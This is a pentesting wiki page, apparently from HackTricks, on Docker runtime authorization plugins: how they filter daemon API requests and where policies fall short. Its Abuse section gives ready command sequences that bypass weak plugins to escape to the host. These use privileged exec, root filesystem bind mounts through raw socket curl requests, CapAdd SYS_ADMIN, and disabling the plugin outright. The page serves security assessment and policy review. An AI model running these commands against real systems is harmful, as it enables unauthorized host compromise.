# Runtime Authorization Plugins

{{#include ../../../banners/hacktricks-training.md}}

## Overview

Runtime authorization plugins are an extra policy layer that decides whether a caller may perform a given daemon action. Docker is the classic example. By default, anyone who can talk to the Docker daemon effectively has broad control over it. Authorization plugins try to narrow that model by examining the authenticated user and the requested API operation, then allowing or denying the request according to policy.

This topic deserves its own page because it changes the exploitation model when an attacker already has access to a Docker API or to a user in the `docker` group. In such environments the question is no longer only "can I reach the daemon?" but also "is the daemon fenced by an authorization layer, and if so, can that layer be bypassed through unhandled endpoints, weak JSON parsing, or plugin-management permissions?"

## Operation

When a request reaches the Docker daemon, the authorization subsystem can pass the request context to one or more installed plugins. The plugin sees the authenticated user identity, the request details, selected headers, and parts of the request or response body when the content type is suitable. Multiple plugins can be chained, and access is granted only if all plugins allow the request.

This model sounds strong, but its safety depends entirely on how completely the policy author understood the API. A plugin that blocks `docker run --privileged` but ignores `docker exec`, misses alternate JSON keys such as top-level `Binds`, or allows plugin administration may create a false sense of restriction while still leaving direct privilege-escalation paths open.

## Common Plugin Targets

Important areas for policy review are:

- container creation endpoints
- `HostConfig` fields such as `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode`, and namespace-sharing options
- `docker exec` behavior
- plugin management endpoints
- any endpoint that can indirectly trigger runtime actions outside the intended policy model

Historically, examples such as Twistlock's `authz` plugin and simple educational plugins such as `authobot` made this model easy to study because their policy files and code paths showed how endpoint-to-action mapping was actually implemented. For assessment work, the important lesson is that the policy author must understand the full API surface rather than only the most visible CLI commands.

## Abuse

The first goal is to learn what is actually blocked. If the daemon denies an action, the error often leaks the plugin name, which helps identify the control in use:

```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```

If you need broader endpoint profiling, tools such as `docker_auth_profiler` are useful because they automate the otherwise repetitive task of checking which API routes and JSON structures are really permitted by the plugin.

If the environment uses a custom plugin and you can interact with the API, enumerate which object fields are really filtered:

```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```

These checks matter because many authorization failures are field-specific rather than concept-specific. A plugin may reject a CLI pattern without fully blocking the equivalent API structure.

### Full Example: `docker exec` Adds Privilege After Container Creation

A policy that blocks privileged container creation but allows unconfined container creation plus `docker exec` may still be bypassed:

```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```

If the daemon accepts the second step, the user has recovered a privileged interactive process inside a container the policy author believed was constrained.

### Full Example: Bind Mount Through Raw API

Some broken policies inspect only one JSON shape. If the root filesystem bind mount is not blocked consistently, the host can still be mounted:

```bash
docker version
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
  http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```

The same idea may also appear under `HostConfig`:

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
  http:/v1.41/containers/create
```

The impact is a full host filesystem escape. The interesting detail is that the bypass comes from incomplete policy coverage rather than from a kernel bug.

### Full Example: Unchecked Capability Attribute

If the policy forgets to filter a capability-related attribute, the attacker may create a container that regains a dangerous capability:

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
  http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```

Once `CAP_SYS_ADMIN` or a similarly strong capability is present, many breakout techniques described in [capabilities.md](protections/capabilities.md) and [privileged-containers.md](privileged-containers.md) become reachable.

### Full Example: Disabling The Plugin

If plugin-management operations are allowed, the cleanest bypass may be to turn the control off entirely:

```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```

This is a policy failure at the control-plane level. The authorization layer exists, but the user it was supposed to restrict still retains permission to disable it.

## Checks

These commands are aimed at identifying whether a policy layer exists and whether it seems to be complete or superficial.

```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```

What is interesting here:

- Denial messages that include a plugin name confirm an authorization layer and often reveal the exact implementation.
- A plugin list visible to the attacker may be enough to discover whether disable or reconfigure operations are possible.
- A policy that blocks only obvious CLI actions but not raw API requests should be treated as bypassable until proven otherwise.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Not enabled by default | Daemon access is effectively all-or-nothing unless an authorization plugin is configured | incomplete plugin policy, blacklists instead of allowlists, allowing plugin management, field-level blind spots |
| Podman | Not a common direct equivalent | Podman typically relies more on Unix permissions, rootless execution, and API exposure decisions than on Docker-style authz plugins | exposing a rootful Podman API broadly, weak socket permissions |
| containerd / CRI-O | Different control model | These runtimes usually rely on socket permissions, node trust boundaries, and higher-layer orchestrator controls rather than Docker authz plugins | mounting the socket into workloads, weak node-local trust assumptions |
| Kubernetes | Uses authn/authz at the API-server and kubelet layers, not Docker authz plugins | Cluster RBAC and admission controls are the main policy layer | overbroad RBAC, weak admission policy, exposing kubelet or runtime APIs directly |
{{#include ../../../banners/hacktricks-training.md}}
